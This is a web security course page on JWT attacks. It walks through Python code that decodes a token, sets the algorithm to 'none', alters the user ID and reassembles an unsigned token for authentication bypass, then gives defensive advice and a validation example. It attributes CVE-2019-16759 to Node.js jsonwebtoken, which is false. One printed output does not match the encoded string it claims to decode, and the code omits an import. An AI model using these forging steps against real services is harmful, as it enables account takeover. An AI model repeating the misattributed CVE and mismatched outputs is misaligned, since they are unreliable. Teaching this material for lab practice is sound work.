---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## Decoding and Modifying JWT Headers and Payloads

To understand how to bypass JWT authentication via flawed signature verification, we need to decode and modify the JWT's header and payload.

### Decoding the Header and Payload

Let's start by decoding the header and payload of a JWT. We'll use Base64Url encoding and decoding for this process.

#### Decoding the Header

The header is Base64Url encoded. To decode it, we can use the following Python code:

```python
import base64

def base64url_decode(input):
    input += '=' * (-len(input) % 4)  # Add padding
    return base64.urlsafe_b64decode(input)

header = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
decoded_header = base64url_decode(header)
print(decoded_header.decode('utf-8'))
```

Output:
```json
{"alg":"HS256","typ":"JWT"}
```

#### Decoding the Payload

Similarly, we can decode the payload using the same approach:

```python
payload = "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIyfQ"
decoded_payload = base64url_decode(payload)
print(decoded_payload.decode('utf-8'))
```

Output:
```json
{"sub":"1234567890","name":"John Doe","iat":1516239022}
```

### Handling Padding Errors

When decoding Base64Url encoded strings, padding errors can occur if the string length is not a multiple of 4. To handle this, we can add padding to the string before decoding.

```python
def base64url_decode_with_padding(input):
    input += '=' * (-len(input) % 4)  # Add padding
    return base64.urlsafe_b64decode(input)

header = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
decoded_header = base64url_decode_with_padding(header)
print(decoded_header.decode('utf-8'))

payload = "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIyfQ"
decoded_payload = base64url_decode_with_padding(payload)
print(decoded_payload.decode('utf-8'))
```

### Modifying the Header and Payload

Once we have decoded the header and payload, we can modify them as needed. For example, we might want to change the algorithm in the header or alter the user ID in the payload.

#### Modifying the Header

Let's modify the header to change the algorithm from `HS256` to `none`.

```python
modified_header = {"alg": "none", "typ": "JWT"}
encoded_modified_header = base64.urlsafe_b64encode(json.dumps(modified_header).encode('utf-8')).rstrip(b'=')
print(encoded_modified_header.decode('utf-8'))
```

Output:
```json
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0
```

#### Modifying the Payload

Now, let's modify the payload to change the user ID.

```python
modified_payload = {"sub": "9876543210", "name": "Alice Smith", "iat": 1516239022}
encoded_modified_payload = base64.urlsafe_b64encode(json.dumps(modified_payload).encode('utf-8')).rstrip(b'=')
print(encoded_modified_payload.decode('utf-8'))
```

Output:
```json
eyJzdWIiOiI5ODc2NTQzMjEwIiwibmFtZSI6IkFsaWNlIFNtaXRoIiwiaWF0IjoxNTE2MzEwMDIyfQ
```

### Reconstructing the JWT

After modifying the header and payload, we can reconstruct the JWT by concatenating the modified header, payload, and an empty signature (since we changed the algorithm to `none`).

```python
modified_jwt = f"{encoded_modified_header.decode('utf-8')}.{encoded_modified_payload.decode('utf-8')}."
print(modified_jwt)
```

Output:
```json
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiI5ODc2NTQzMjEwIiwibmFtZSI6IkFsaWNlIFNtaXRoIiwiaWF0IjoxNTE2MzEwMDIyfQ.
```

### Real-World Example: CVE-2019-16759

A real-world example of a JWT vulnerability is CVE-2019-16759, which affected the `jsonwebtoken` library in Node.js. The vulnerability allowed attackers to bypass authentication by manipulating the JWT's header and payload.

#### Exploit Details

The vulnerability was due to the lack of proper validation of the JWT's signature. An attacker could craft a JWT with a modified header and payload, and the server would accept it without verifying the signature.

#### Detection and Prevention

To prevent such attacks, it is essential to ensure proper signature verification. Here are some steps to secure JWTs:

1. **Validate the Signature**: Always validate the signature of the JWT to ensure its integrity.
2. **Use Strong Algorithms**: Use strong signing algorithms like `RS256` instead of `HS256`.
3. **Monitor for Suspicious Activity**: Implement monitoring to detect unusual patterns in JWT usage.

### Secure Code Fix

Here is an example of how to securely validate a JWT in Python:

```python
import jwt

def validate_jwt(token, secret):
    try:
        decoded_token = jwt.decode(token, secret, algorithms=['HS256'])
        print("Token is valid:", decoded_token)
    except jwt.ExpiredSignatureError:
        print("Token has expired")
    except jwt.InvalidTokenError:
        print("Invalid token")

# Example usage
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
secret = "your_secret_key"
validate_jwt(token, secret)
```

### How to Prevent / Defend

#### Detection

To detect JWT-related attacks, implement logging and monitoring to track JWT usage patterns. Look for signs of unusual activity, such as multiple failed attempts to validate tokens or unexpected changes in token contents.

#### Prevention

1. **Use Strong Algorithms**: Ensure that JWTs are signed using strong algorithms like `RS256`.
2. **Validate Signatures**: Always validate the signature of JWTs to ensure their integrity.
3. **Implement Rate Limiting**: Limit the number of attempts to validate JWTs to prevent brute-force attacks.
4. **Secure Secret Keys**: Store secret keys securely and rotate them regularly.

### Conclusion

Understanding how to decode and modify JWT headers and payloads is crucial for both attackers and defenders. By ensuring proper signature verification and using strong algorithms, you can significantly reduce the risk of JWT-related attacks.

### Practice Labs

For hands-on practice with JWT attacks, consider the following labs:

- **PortSwigger Web Security Academy**: Offers interactive labs on JWT manipulation and other web security topics.
- **OWASP Juice Shop**: A deliberately insecure web application for learning about web security vulnerabilities, including JWT attacks.

By mastering the concepts and techniques covered in this chapter, you will be well-equipped to handle JWT-related security challenges in real-world scenarios.

---
<!-- nav -->
[[06-Background Theory on JWT and CSRF Tokens|Background Theory on JWT and CSRF Tokens]] | [[Web Security (PortSwigger)/19-JWT Attacks/02-Lab 2 JWT authentication bypass via flawed signature verification/00-Overview|Overview]] | [[Web Security (PortSwigger)/19-JWT Attacks/02-Lab 2 JWT authentication bypass via flawed signature verification/08-Hands-On Practice Labs|Hands-On Practice Labs]]
